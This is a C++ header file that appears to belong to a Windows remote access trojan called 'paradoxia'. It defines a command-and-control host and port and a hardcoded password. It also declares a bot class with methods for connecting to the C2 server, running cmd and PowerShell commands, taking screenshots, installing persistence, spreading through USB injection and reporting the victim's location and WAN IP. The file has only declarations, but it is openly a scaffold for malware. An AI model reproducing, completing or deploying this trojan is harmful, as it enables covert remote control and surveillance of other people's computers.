#ifndef PARADOXIA
#define PARADOXIA

#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <fstream>
#include <sstream>
#include <tchar.h>
#include <string>
#include <tlhelp32.h>
#include <gdiplus.h>

#define SERVER_HOST "127.0.0.1"
#define SERVER_PORT 443

#define PASSWORD "password" // ROT 13 !
#define MAX_PASSWORD 100

#define BUFFER 4096
#define SLEEP_INTERVAL 5000
#define NTSTATUS LONG
#define UNLEN 256
#define PROCESSORS 1
#define PAGESIZE 2
#define MINAPPADDR 3
#define MAXAPPADDR 4
#define DIR_CHANGE_SUCCESS 21

static bool connected = false;
static bool authenticated = false;

DWORD WINAPI USB_INJECT(LPVOID lpParameter);

class paradoxia {
    public:
    HANDLE hThread;
    bool USBTHREADSTATUS();
    char username[UNLEN + 1];
    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD len = UNLEN + 1;
	DWORD hlen = sizeof(hostname) / sizeof(hostname[0]);
    char recvbuf[BUFFER];
    char temporary_buffer[BUFFER];
    char password_buf[MAX_PASSWORD];
    char wanip[BUFFER];
	WIN32_FIND_DATA data;
    SOCKET sockfd;
    void startup();
    void SendStr(const char * data);
    int changeDirectory(char* to);
    std::string OS();
    struct sockaddr_in server;
    void REConnect();
    void C2Connect();
    void ExecuteCMD(char* toExecute);
    void ExecutePS(char* toExecute);
    TCHAR DIR[MAX_PATH];
    std::string SYSTEMINFO(int mode);
    std::string UserPC();
    void TALK();
    void screenshot(std::string file);
    std::string BOTLocation();
    void Install();
    void WANIP();
    std::string ramsize(int mode);
    char* cDir();
    void ExecuteFile(char* filename);
    DWORD ProcessId(LPCTSTR ProcessName);
};

#endif